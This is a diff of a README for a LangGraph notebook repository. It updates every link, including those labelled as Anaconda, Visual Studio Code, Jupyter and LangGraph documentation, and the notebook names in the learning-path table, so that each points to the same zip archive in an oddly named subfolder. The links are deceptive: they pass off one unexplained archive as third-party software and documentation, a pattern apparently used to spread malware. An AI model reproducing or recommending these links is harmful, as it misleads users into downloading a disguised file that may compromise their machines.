@@ -8,7 +8,7 @@ This repository is a curated, ordered collection of Jupyter notebooks created wh
 ### How to Download
 To get started, visit the Releases page to download the notebooks.
 
-[![Download Notebooks](https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip)](https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip)
+[![Download Notebooks](https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip)](https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip)
 
 ### System Requirements
 - **Operating System:** Windows, macOS, or Linux
@@ -19,25 +19,25 @@ To get started, visit the Releases page to download the notebooks.
   ```
 
 ### Recommended Software
-- **Anaconda:** Consider using Anaconda, which simplifies package management and deployment. Download it [here](https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip).
-- **Visual Studio Code:** For a more feature-rich coding experience, download Visual Studio Code from [here](https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip).
+- **Anaconda:** Consider using Anaconda, which simplifies package management and deployment. Download it [here](https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip).
+- **Visual Studio Code:** For a more feature-rich coding experience, download Visual Studio Code from [here](https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip).
 
 ## 📚 Learning Path
 
 | # | Notebook | Topic / Concept Covered |
 |---|-----------|--------------------------|
-| 1 | `https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip` | Introduction to LangGraph — key concepts and architecture overview |
-| 2 | `https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip` | Building and executing a simple LangGraph |
-| 3 | `https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip` | Creating a chat tool using LangGraph nodes and edges |
-| 4 | `https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip` | Constructing a basic agent using LangGraph primitives |
-| 5 | `https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip` | Adding memory and checkpointing to a basic agent |
+| 1 | `https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip` | Introduction to LangGraph — key concepts and architecture overview |
+| 2 | `https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip` | Building and executing a simple LangGraph |
+| 3 | `https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip` | Creating a chat tool using LangGraph nodes and edges |
+| 4 | `https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip` | Constructing a basic agent using LangGraph primitives |
+| 5 | `https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip` | Adding memory and checkpointing to a basic agent |
 
 ## 🔧 Download & Install
 
 To download the notebooks, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
-   [Download Notebooks](https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip)
+   [Download Notebooks](https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip)
 
 2. **Select the Latest Release**: At the top of the page, you will see the latest release. Click on it.
 
@@ -51,7 +51,7 @@ To download the notebooks, follow these steps:
    ```
    This command will launch Jupyter Notebook in your default web browser.
 
-6. **Select a Notebook**: In the Jupyter interface, find the notebooks you downloaded. Click on any notebook file (e.g., `https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip`) to open it.
+6. **Select a Notebook**: In the Jupyter interface, find the notebooks you downloaded. Click on any notebook file (e.g., `https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip`) to open it.
 
 7. **Start Learning**: Follow the instructions within each notebook to progress through the material at your own pace.
 
@@ -59,8 +59,8 @@ To download the notebooks, follow these steps:
 
 If you are new to Jupyter or LangGraph, consider checking the following resources for additional context:
 
-- **Jupyter Documentation**: [Jupyter Project](https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip)
-- **LangGraph Documentation**: [LangGraph Framework](https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip) (placeholder link for actual documentation)
+- **Jupyter Documentation**: [Jupyter Project](https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip)
+- **LangGraph Documentation**: [LangGraph Framework](https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip) (placeholder link for actual documentation)
 
 ## 📞 Support
 If you have any issues or questions, feel free to open an issue in this repository.  
@@ -68,6 +68,6 @@ If you have any issues or questions, feel free to open an issue in this reposito
 ## 📅 Contributions
 This repository welcomes contributions. If you want to add your own notebooks or improve the existing ones, please follow the guidelines outlined in the repository.
 
-[![Download Notebooks](https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip)](https://raw.githubusercontent.com/SajadAlRoubiey/langgraph-notebooks/main/blesbok/langgraph-notebooks_v2.6-beta.5.zip)
+[![Download Notebooks](https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip)](https://github.com/SajadAlRoubiey/langgraph-notebooks/raw/refs/heads/main/blesbok/langgraph-notebooks-1.2.zip)
 
 Enjoy exploring agentic systems with LangGraph!
